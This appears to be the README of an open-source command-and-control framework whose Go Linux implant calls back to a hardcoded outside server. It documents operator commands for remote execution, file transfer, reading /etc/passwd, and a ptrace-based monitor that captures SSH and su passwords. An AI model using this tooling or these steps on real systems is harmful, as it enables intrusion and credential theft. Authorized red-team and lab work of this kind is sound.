# light_house

<p align="center">
  <img src="https://github.com/user-attachments/assets/549396a2-12f9-40d0-b243-412365335327"
       alt="LightHouse project artwork"
       width="512" height="512" />
</p>

LightHouse is a beta release command-and-control project for authorized lab and assessment work. If you encounter an issue or have a suggestion, open an issue or create a PR.

![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)

## Design

LightHouse is split into four main pieces:

- `lighthouse`: the Python FastAPI server that exposes the HTTPS API.
- `galleon`: the Go Linux agent that checks in, receives tasking, runs commands, and posts results.
- `merchant`: the Python operator client for user, session, and task management.
- SQLite: the local database for users, implants, tasking, and results.

The normal flow is:

```text
merchant client <-> lighthouse server <-> galleon agent
                         |
                      SQLite
```

The project uses a nautical theme. Agent names are based on 15th-17th century ship classes.

```text
Galleon: a sailing ship in use, especially by Spain, from the 15th through 17th centuries,
originally as a warship and later for trade.
```

## Prerequisites

- Python 3 and `pip`
- Go for building the `galleon` agent
- SQLite CLI for resetting the database with `db/reset_db.sh`
- OpenSSL for generating TLS certificates with `certs/gen_certs.sh`
- UPX for compressed agent builds

## Setup

```bash
git clone https://github.com/ice-wzl/light_house.git
cd light_house
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

Install system packages as needed:

```bash
sudo apt install golang sqlite3 openssl upx
```

## Database Setup

The server uses `db/database.db`. To create or reset the database from `db/schema.sql`:

```bash
cd db
./reset_db.sh
cd ..
```

The schema creates a default user:

```text
username: admin
password: password
```

Change the default credentials after first login.

## Certificate Setup

The server runs with TLS. The default config expects `certs/server.crt` and `certs/server.key`.

```bash
cd certs
./gen_certs.sh
cd ..
```

The client currently connects with certificate verification disabled, so self-signed certificates are supported for development and lab use.

## Lighthouse Server

Server runtime settings live in `server/lighthouse.conf`:

```yaml
debug: true
server_crt: certs/server.crt
server_key: certs/server.key
listen_host: 0.0.0.0
listen_port: 8000
```

Run the server from the project root so relative certificate paths resolve correctly:

```bash
python3 server/lighthouse.py -c server/lighthouse.conf
```

## Galleon Agent

The Go agent is Linux-only. Its callback settings live in `agent/agent_config/config.go`:

```go
const ServerUrl = "https://coder.space:8000"
var CallbackVal = 1
var JitterVal = 15
var SelfTerminateVal = 20
var StartDelayVal = 5
var RetryTimerVal = 60
```

Configuration values:

- `ServerUrl`: Lighthouse server URL, including `https://` and port.
- `CallbackVal`: minutes between checkins.
- `JitterVal`: maximum jitter percentage applied to the callback interval.
- `SelfTerminateVal`: failed checkins before the agent terminates.
- `StartDelayVal`: seconds to wait before the initial checkin.
- `RetryTimerVal`: seconds between initial checkin retries.

Build the agent from the `agent` directory:

```bash
cd agent
# debug build for testing only
python3 build_agent.py -a amd64 -d
# release build 
python3 build_agent.py -a amd64
```

The `-a` value must be one of the supported Go architectures in `build_agent.py`. The script builds Linux binaries into `agent/build/`, strips debug information with Go linker flags, and runs UPX compression. The `-d` flag enables Go debug build tags.

## Merchant Client

Run the client from the project root:

```bash
python3 client/merchant.py -u admin -p password -s 127.0.0.1:8000
```

Arguments:

- `-u`, `--username`: Lighthouse username.
- `-p`, `--password`: Lighthouse password.
- `-s`, `--server`: Lighthouse host and port without a URL scheme.

The client writes the current JWT to `.auth-token` and refreshes it during the session.

After logging in, create a new user and remove the default account:

```text
!server > user_add root <strong-password>
[*] User created successfully

!server > users
...

!server > user_delete 1
[*] User id 1 deleted
```

## Server Context Commands

Commands available at the `!server >` prompt:

| Command | Description |
| --- | --- |
| `sessions` | List known agent sessions. |
| `interact <session-id>` | Enter the tasking context for a session. |
| `tasking <session-id>` | View tasking for a session without entering it. |
| `users` | List Lighthouse users. |
| `user <user-id>` | Show one user. |
| `user_add <username> <password>` | Create a user. |
| `user_delete <user-id>` | Delete a user. |
| `quit` | Exit merchant. |

Example:

```text
!server > sessions
+----------+-------+---------------------+---------------------+------------+------+----------+
| Session  | Alive |      Last Seen      |      First Seen     | CB Freq(m) | User | Hostname |
+----------+-------+---------------------+---------------------+------------+------+----------+
| a3eb41eb |  True | 2025-06-14 15:00:08 | 2025-06-14 15:00:08 |     1      | root |  debian  |
+----------+-------+---------------------+---------------------+------------+------+----------+

!server > interact a3eb41eb
!session >
```

## Session Context Commands

Commands available at the `!session >` prompt:

| Command | Description |
| --- | --- |
| `info` | Show current session details. |
| `ls [path]` | List a remote directory. Defaults to `.`. |
| `ps` | Return a remote process listing. |
| `exec_fg "<command>"` | Execute a command and capture stdout/stderr. |
| `exec_bg "<command>"` | Execute a command without capturing output. |
| `download <remote-path>` | Read and return a remote file. |
| `upload <local-path> <remote-path>` | Upload a local file to the remote host. |
| `reconfig <callback-mins> <jitter> <max-errors>` | Change callback behavior for the running session. |
| `ssh_monitor on\|off` | Start or stop SSH/SU credential monitoring. |
| `view <task-id>` | View results for a task. |
| `view creds` | View credentials captured by `ssh_monitor`. |
| `tasking` | View tasking for the current session. |
| `kill` | Terminate the agent process after confirmation. |
| `help <command>` | Show command-specific help. |
| `back` | Return to the server context. |

Most commands enqueue tasking. Use `tasking` to find the task ID and `view <task-id>` to read the result after the agent checks in.

```text
!session > ls /
[*] Tasking successfully sent

!session > tasking
+----+----------+---------------------+------+------+----------+
| ID | Session  |      Date Sent      | Task | Args | Complete |
+----+----------+---------------------+------+------+----------+
| 1  | a3eb41eb | 2025-06-14 15:02:02 |  ls  |  /   |   True   |
+----+----------+---------------------+------+------+----------+

!session > view 1
+----+----------+---------------------+------+------+
| ID | Session  |    Date Received    | Task | Args |
+----+----------+---------------------+------+------+
| 1  | a3eb41eb | 2025-06-14 15:02:13 |  ls  |  /   |
+----+----------+---------------------+------+------+
drwxrwxrwt      2025-06-14T09:18:47Z   4096       tmp
drwxr-xr-x      2025-04-27T22:55:50Z   4096       home
--snip--
```

## SSH Credential Monitoring

`ssh_monitor` is an agent task that uses `ptrace` to monitor new `sshd` and `su` processes. Captured values are stored as `ssh_monitor` results and can be displayed later with `view creds`.

Important constraints:

- The agent generally needs root privileges or `CAP_SYS_PTRACE` to attach to target processes.
- Current code monitors `ssh`/`sshd` and `su` flows. It does not include a dedicated `sudo` tracer.
- Monitoring only applies after `ssh_monitor on` has been processed by the agent.
- The monitor skips the first matching SSH and SU process after startup, then traces later matching processes.

Enable monitoring:

```text
!session > ssh_monitor on
[*] Tasking successfully sent
```

Confirm the status through normal task results:

```text
!session > tasking
+----+----------+---------------------+-------------+------+----------+
| ID | Session  |      Date Sent      |     Task    | Args | Complete |
+----+----------+---------------------+-------------+------+----------+
| 9  | a3eb41eb | 2025-06-14 15:20:01 | ssh_monitor |  on  |   True   |
+----+----------+---------------------+-------------+------+----------+

!session > view 9
ssh monitor started
```

View captured credentials:

```text
!session > view creds
+---------------------+-------------------------+
| Date                | Result                  |
+---------------------+-------------------------+
| 2025-06-14 15:25:31 | root:captured-password  |
+---------------------+-------------------------+
```

Stop monitoring:

```text
!session > ssh_monitor off
[*] Tasking successfully sent
```

## Common Task Examples

Run a foreground command and view output:

```text
!session > exec_fg "uname -a"
[*] Tasking successfully sent

!session > tasking
-- find the exec_fg task ID --

!session > view <task-id>
Linux debian ...
```

Run a background command:

```text
!session > exec_bg "sleep 200"
[*] Tasking successfully sent
```

Download a remote file:

```text
!session > download /etc/passwd
[*] Tasking successfully sent

!session > view <task-id>
root:x:0:0:root:/root:/bin/bash
--snip--
```

Upload a local file:

```text
!session > upload /tmp/local.bin /dev/shm/remote.bin
[*] Tasking successfully sent
```

Reconfigure callback behavior:

```text
!session > reconfig 5 15 20
[*] Tasking successfully sent
```

## Testing

Run the Python test suite from the project root:

```bash
pytest
```

The current tests cover health, user, token, implant, and server basics. Agent-side behavior such as `ssh_monitor` is not covered by the Python test suite.
